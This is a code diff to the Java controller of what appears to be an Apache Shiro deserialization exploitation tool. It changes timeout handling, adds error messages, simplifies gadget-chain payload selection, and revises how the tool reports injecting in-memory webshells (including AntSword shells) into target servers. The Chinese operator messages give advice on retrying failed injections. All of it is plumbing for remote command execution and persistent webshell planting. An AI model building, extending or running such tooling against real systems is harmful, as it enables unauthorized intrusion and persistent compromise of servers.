@@ -79,7 +79,6 @@ public class VulController {
     private TextField targeturl;
 
 
-
     public static int TimeOut(TextField timevalue) {
         return Integer.parseInt(timevalue.getText()) * 1000;
     }
@@ -211,7 +210,7 @@ public class VulController {
                     try {
                         final String sendpayload = payload.sendpayload(DserUtil.principal, shirokey);
 
-                        boolean flag = DserUtil.execTest(targeturl.getText(), sendpayload, TimeOut(httptimeout));
+                        boolean flag = DserUtil.execTest(targeturl.getText(), sendpayload, DserUtil.timeout);
                         Thread.sleep(200);
                         if (flag) {
 //                            final String rememberMeExec = payload.sendpayload(chainObject, shirokey);
@@ -256,6 +255,8 @@ public class VulController {
         String cmd = command.getText().trim();
         String Shiro_key = shiroKey.getText().trim();
 
+        DserUtil.timeout = TimeOut(httptimeout);
+
         if ("".equals(target)) {
             System.out.println("please input target");
         } else if ("".equals(execoption) || "".equals(gadgetOption)) {
@@ -264,15 +265,19 @@ public class VulController {
         } else if ("".equals(cmd) && !checkecho.isSelected()) {
             System.out.println("please input command");
         } else if (shiroRememberme != null) {
-            String commandResult = DserUtil.exec(target, shiroRememberme, cmd, TimeOut(httptimeout));
+            String commandResult = DserUtil.exec(target, shiroRememberme, cmd, DserUtil.timeout);
             if (commandResult != null) {
                 resultoutput.appendText("-------------------------------\n");
                 resultoutput.appendText(commandResult);
                 resultoutput.appendText("-------------------------------\n");
+            }else{
+                resultoutput.appendText("-------------------------------\n");
+                resultoutput.appendText("[x] 该命令执行失败请重试\n");
+                resultoutput.appendText("-------------------------------\n");
             }
         } else {
             // 判断是否存在rememberMe字段
-            boolean flag = DserUtil.rememberMe(target, TimeOut(httptimeout));
+            boolean flag = DserUtil.rememberMe(target, DserUtil.timeout);
             if (!flag) {
                 resultoutput.setText("该目录未发现rememberMe信息，请重试\n");
             } else {
@@ -284,18 +289,12 @@ public class VulController {
                 Object template = Gadgets.createTemplatesImpl(execoption);
                 // 回显payload选择
                 Object chainObject;
-                if ("NoEcho".equals(execoption)) {
-                    chainObject = DserUtil.gadgetpayload.getObject(cmd);
-                } else {
-                    chainObject = DserUtil.gadgetpayload.getObject(template);
-                }
-
+                chainObject = DserUtil.gadgetpayload.getObject(template);
 
                 // shiro加载key
                 if (!shiroKey.isDisable()) {
                     shiroKeys.add(Shiro_key);
                     if (checkecho.isSelected()) {
-
                         shiroTest(DserUtil.genpayload, shiroKeys);
                     } else {
                         shiroEcho(DserUtil.genpayload, chainObject, shiroKeys, cmd);
@@ -379,8 +378,9 @@ public class VulController {
         Object chainObject = DserUtil.gadgetpayload.getObject(template);
         String rememberMe = DserUtil.genpayload.sendpayload(chainObject, key);
 
-        boolean flag = DserUtil.execInject(target, rememberMe, b64Bytecode, injectPath, injectPass, TimeOut(httptimeout));
-        if (flag) {
+        String result = DserUtil.execInject(target, rememberMe, b64Bytecode, injectPath, injectPass, TimeOut(httptimeout));
+
+        if (result !=null && result.contains("dynamic inject success")) {
             URL url = new URL(target);
             int port;
             if (url.getPort() == -1) {
@@ -395,7 +395,7 @@ public class VulController {
             resultoutput.appendText(domain + injectPath + '\n');
             if (memOption.contains("蚁剑")) {
                 resultoutput.appendText("\n");
-                resultoutput.appendText("ps: 蚁剑马请求访问编码均为hex (最新版)\n");
+                resultoutput.appendText("ps: 蚁剑马->CUSTOM类型->请求返回均hex编码 (最新版)\n");
             } else {
                 resultoutput.appendText("\n");
                 resultoutput.appendText("ps: 马儿默认配置\n");
@@ -403,7 +403,7 @@ public class VulController {
             resultoutput.appendText("-------------------\n");
         } else {
             resultoutput.setText("-------------------\n");
-            resultoutput.appendText("注入失败请勿重复注入相同马,可尝试其他内存马并修改注入路径\n");
+            resultoutput.appendText("注入失败，请尝试更换目录（寻找网站资源目录）或使用其他内存马测试。\n");
             resultoutput.appendText("-------------------\n");
         }
 
